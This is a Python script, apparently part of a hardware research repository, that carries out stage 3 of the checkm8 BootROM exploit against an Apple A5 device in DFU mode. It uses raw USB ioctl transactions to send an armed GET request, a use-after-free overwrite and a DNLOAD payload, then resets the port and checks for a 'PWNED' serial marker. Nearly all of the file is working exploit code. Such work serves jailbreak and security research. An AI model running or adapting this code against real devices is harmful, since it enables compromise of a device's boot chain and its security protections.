#!/usr/bin/env python3
"""pwn-stage3-direct.py - stage 3 on a freshly captured poisoned-heap DFU.

Chip state this targets (measured Nov 15, dmesg 13243-13301):
after the knife-edge the kernel's own port reset made the chip
re-enter DFU (disconnect + 4 reconnects as device numbers 43-46),
but every descriptor read fails (-110 / -90 / -75 babble) because
the re-entered DFU runs on the sprayed io heap - the checkm8
stage-2 end-state. khubd then abandons the port (ccs=1, ped=0).

Sequence:
  1. (caller does: raw0reset PR on the wedged port -> khubd retries
     the enumeration -> the fresh raw0 hook captures slot + ring)
  2. wait for IOC_STATE.state == 1
  3. armed crit-IN CYC (0x80 GET, wLength 0x81)
  4. UAF write CYC (bogus 00/00 wLength 0x40: 0x40 x CC + overwrite)
  5. payload CYC (DNLOAD wLength 0x2C0: 0x40 x CC + 704B payload)
  6. IOC12 hardware port reset (MMIO - the wedged kernel path is dead)
  7. verify the PWND:[checkm8] serial
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    # xhci, slot, ring_addr_lo, num_trbs_free, cycle, state,
    # trbs_pushed, deq_off, ep0_state
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def main():
    payload, overwrite = P.load_payloads('classic')
    print('*** stage3-direct: payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))

    fd = os.open('/dev/raw0', os.O_RDWR)
    t0 = time.time()
    got = False
    while time.time() - t0 < 30.0:
        f = state(fd)
        if f[5]:
            print('[capture] slot=%d ring=0x%x ep0st=%08x t=%.2fs'
                  % (f[1], f[2], f[8], time.time() - t0))
            got = True
            break
        time.sleep(0.01)
    if not got:
        print('no capture in 30s - the port reset did not wake khubd')
        os.close(fd)
        return 1

    rc = cyc(fd, bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00]),
             b'\x00' * 0x41)
    print('[s3] armed crit-IN CYC rc=%d' % rc)
    time.sleep(0.1)

    data = b'\xCC' * 0x40 + overwrite
    rc = cyc(fd, bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00]),
             data)
    print('[s3] UAF write CYC rc=%d' % rc)
    time.sleep(0.3)

    data = b'\xCC' * 0x40 + payload
    rc = cyc(fd, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02]),
             data)
    print('[s3] payload CYC rc=%d' % rc)
    time.sleep(0.5)

    buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
    fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
    before, after = struct.unpack_from('<II', buf, 4)
    print('[P4] portreset PR: before=%08x after=%08x' % (before, after))

    time.sleep(3.0)
    usb = P.LibUSB()
    P.LibUSB._current = usb
    serial = P.verify(usb)
    print('[verify] serial: %r' % serial)
    os.close(fd)
    if P.PWN_MARKER in serial:
        print('*** PWNED DFU - host-only checkm8 A5 achieved ***')
        return 0
    return 2


if __name__ == '__main__':
    sys.exit(main())
